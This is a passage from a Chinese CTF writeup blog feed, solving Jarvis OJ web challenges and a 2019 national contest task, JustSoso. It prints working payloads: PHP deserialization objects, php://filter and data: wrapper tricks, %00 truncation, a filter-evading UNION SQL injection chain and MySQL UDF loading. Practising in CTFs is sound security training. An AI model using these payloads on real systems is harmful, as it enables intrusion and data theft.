class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>可以看到flag在pctf.php中,但做了过滤无法直接读取,考虑到index.php做了反序列化操作,并且在进行初始化的时候，将$filename赋值为pctf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构造序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">echo</span> serialize($x);</span><br><span class="line"></span><br><span class="line"><span class="comment">#O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>最终payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--?php </span></span><br><span class="line"><span class="comment">//Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span></span><br><span class="line"><span class="comment">//Fake flag:</span></span><br><span class="line"><span class="comment">echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"</span></span><br><span class="line"><span class="comment">?--&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="IN-A-MESS"><a href="#IN-A-MESS" class="headerlink" title="IN A MESS"></a>IN A MESS</h2><p>题目入口：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p><blockquote><p>连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。</p></blockquote><ol><li><p>查源码发现index.phps</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">header(<span class="string">'Location: index.php?id=1'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php">$a=$_GET[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b=$_GET[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> ;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$data = @file_get_contents($a,<span class="string">'r'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>下面构造payload</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id可以用弱类型来解决 id=<span class="number">0</span>b</span><br><span class="line">eregi函数可以用<span class="comment">%00截断 b=%0011111</span></span><br><span class="line">难点在于a,可用php://input,然后post数据<span class="number">1112</span> is a nice lab!</span><br><span class="line">也可以data协议a=data:,<span class="number">1112</span> is a nice lab!</span><br><span class="line"></span><br><span class="line">#返回： Come ON!!! &#123;/^HT2mCpcvOLf&#125;</span><br></pre></td></tr></table></figure></li><li><p>然而这并不像flag,而是路径，访问之自动跳到<a href="http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1</a></p><blockquote><p>回显:hi666</p></blockquote></li><li><p>更改id发现</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=2</span><br><span class="line">回显:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">content</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">2</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span> <span class="comment">#</span></span><br><span class="line">回显:you bad boy/girl!</span><br></pre></td></tr></table></figure></li><li><p>明显的sql注入了,而且过滤了很多关键字和空格，尝试用双写和/*1*/代替</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br><span class="line">到这回显<span class="number">3</span>，说明有<span class="number">3</span>个字段</span><br><span class="line"></span><br><span class="line">查库:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,database()<span class="meta">#</span></span><br><span class="line">回显:test</span><br><span class="line"></span><br><span class="line">查表:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>group_concat(table_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>information_schema.tables<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_schema=database())%<span class="number">23</span></span><br><span class="line">回显:content</span><br><span class="line"></span><br><span class="line">查列:<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>group_concat(column_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>information_schema.columns<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_name=<span class="number">0x636f6e74656e74</span>)%<span class="number">23</span></span><br><span class="line">回显:<span class="keyword">id</span>,context,title</span><br><span class="line"></span><br><span class="line">查内容:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>context<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>content)%<span class="number">23</span></span><br><span class="line">回显:PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h2><blockquote><p>咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦</p></blockquote><ol><li>这道题完全复现别人的，挺有意思的，没有链接，只给了一个文件<a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">udf.so.02f8981200697e5eeb661e64797fc172</a></li><li><p>关于UDF的介绍</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UDF是mysql的一个拓展接口，UDF（Userdefined <span class="function"><span class="keyword">function</span>）可翻译为用户自定义函数，这个是用来拓展<span class="title">Mysql</span>的技术手段。</span></span><br><span class="line"></span><br><span class="line">简单来说，udf是为了拓展功能而可以自行添加函数，不过添加的函数为恶意函数就能导致代码执行。</span><br><span class="line"></span><br><span class="line">OK，返回题目，题目给出的提示是“不过里面有个help_me函数挺有意思的哦”，那就是说这里需要创建自定义函数了。</span><br><span class="line"></span><br><span class="line">创建自定义函数的语法：<span class="built_in">create</span> <span class="function"><span class="keyword">function</span> 函数名 <span class="title">returns</span> <span class="title">string</span> <span class="title">soname</span> ‘导出的<span class="title">DLL</span>路径’；</span></span><br></pre></td></tr></table></figure></li><li><p>在Ubuntu上下载文件</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">https:</span><span class="comment">//dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span></span><br></pre></td></tr></table></figure></li><li><p>拷贝至/usr/lib/mysql/plugin,然后启动mysql服务并登陆</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service mysql <span class="literal">start</span></span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></li><li><p>创建题目提示的自定义函数并访问</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create function help<span class="emphasis">_me returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';</span></span><br><span class="line"><span class="emphasis">ERROR 1125 (HY000): Function 'help_</span>me' already exists</span><br><span class="line">mysql&gt; select help<span class="emphasis">_me();</span></span><br><span class="line"><span class="emphasis">+---------------------------------------------+</span></span><br><span class="line"><span class="emphasis">| help_</span>me()                                   |</span><br><span class="line"><span class="code">+---------------------------------------------+</span></span><br><span class="line">| use getflag function to obtain your flag!!</span><br><span class="line"><span class="code"> |</span></span><br><span class="line"><span class="code">+---------------------------------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create function getflag returns string soname <span class="emphasis">'udf.so.02f8981200697e5eeb661e64797fc172'</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select getflag();</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br><span class="line">| getflag()                                |</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br><span class="line">| PCTF&#123;Interesting<span class="emphasis">_U5er_</span>d3fined<span class="emphasis">_Function&#125;</span></span><br><span class="line"><span class="emphasis"> |</span></span><br><span class="line"><span class="emphasis">+------------------------------------------+</span></span><br><span class="line"><span class="emphasis">1 row in set (0.00 sec)</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>今天就写到这把，题目不难，很基础算开学初找下手感把。<del>其实还是太累了不想做啊</del></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;del&gt;我还是太懒了，已经半年没更新博客，跟个废人一样。&lt;/del&gt;这个学期要振作起来！ 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，&lt;strong&gt;下面附上队友大腿的WP&lt;/strong&gt;&lt;br&gt;&lt;a href=&quot;https://lzy-wi.github.io/2019/09/11/qiangwangbei-GD-writewp/#more&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;2019广东省强网杯writeup&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="平台训练" scheme="https://cy9nusg4rd3n.github.io/categories/%E5%B9%B3%E5%8F%B0%E8%AE%AD%E7%BB%83/"/>
    
    
      <category term="Web" scheme="https://cy9nusg4rd3n.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://cy9nusg4rd3n.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>国赛2019初赛部分WP</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/04/22/%E5%9B%BD%E8%B5%9B2019%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/04/22/国赛2019初赛部分WP/</id>
    <published>2019-04-22T07:09:28.000Z</published>
    <updated>2020-04-18T03:26:57.818Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h2><ol><li><p>?file=php://filter/read=convert.base64-encode/resource=hint.php</p><a id="more"></a><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $handle;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;handle = $handle; </span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $token_flag;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;file = $file;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span></span><br><span class="line"><span class="php">            &#125;  </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span>2+,ing</span><br></pre></td></tr></table></figure></li><li><p>?file=php://filter/read=convert.base64-encode/resource=index.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">"file"</span>]; </span></span><br><span class="line"><span class="php">$payload = $_GET[<span class="string">"payload"</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">@<span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span></span><br><span class="line"><span class="php">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span></span><br><span class="line"><span class="php">    parse_str($url[<span class="string">'query'</span>],$query);</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $payload = unserialize($payload);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">&lt;!--Please test index.php?file=xxx.php --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Please get the source of hint.php--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>2+,ing</span><br></pre></td></tr></table></figure></li><li><p>payload这里执行了反序列操作，file变量填入hint.php将类文件导入进来，这里我们需要绕过parse_url，例如<a href="http://127.0.0.1///index.php" target="_blank" rel="noopener">http://127.0.0.1///index.php</a> 即可绕过从而执行payload</p></li><li>这里还有一个地方需要绕过：<blockquote><p>$this-&gt;token === $this-&gt;token_flag</p></blockquote></li><li>这里使用指针将其指为一个地址即可</li><li><p>构造payload</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">class Handle&#123;</span></span><br><span class="line"><span class="xml">    private $handle;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    public function __construct($handle) &#123;</span></span><br><span class="line"><span class="xml">        $this-&gt;handle = $handle;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    public function __destruct()&#123;</span></span><br><span class="line"><span class="xml">        $this-&gt;handle-&gt;getFlag();</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">class Flag&#123;</span></span><br><span class="line"><span class="xml">    public $file;</span></span><br><span class="line"><span class="xml">    function __construct($file)&#123;</span></span><br><span class="line"><span class="xml">        $this-&gt;file = $file;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    public function getFlag()&#123;</span></span><br><span class="line"><span class="xml">        if(isset($this-&gt;file))&#123;</span></span><br><span class="line"><span class="xml">            echo @highlight_file($this-&gt;file,true);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">$flag = new Flag('flag.php');</span></span><br><span class="line"><span class="xml">$flag -&gt;token = &amp;$flag -&gt; token_flag;</span></span><br><span class="line"><span class="xml">$exp = new Handle($flag);</span></span><br><span class="line"><span class="xml">echo urlencode(serialize($exp)).PHP_EOL;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">//O%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php</span></span><br><span class="line"><span class="xml"></span><span class="perl">%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D</span><span class="xml"></span></span><br></pre></td></tr></table></figure></li><li><p>还有一个地方需要绕过，绕过wakeup函数，实际上是1，我们将变量改为大于1即可绕过</p></li></ol><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="puzzles"><a href="#puzzles" class="headerlink" title="puzzles"></a>puzzles</h2><h3 id="question-0"><a href="#question-0" class="headerlink" title="question 0"></a>question 0</h3><p><img src="https://uploader.shimo.im/f/wXjE150u7LMqjLEf.png!thumbnail" alt=""><br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">a1:</span><span class="number">0xfa6</span></span><br><span 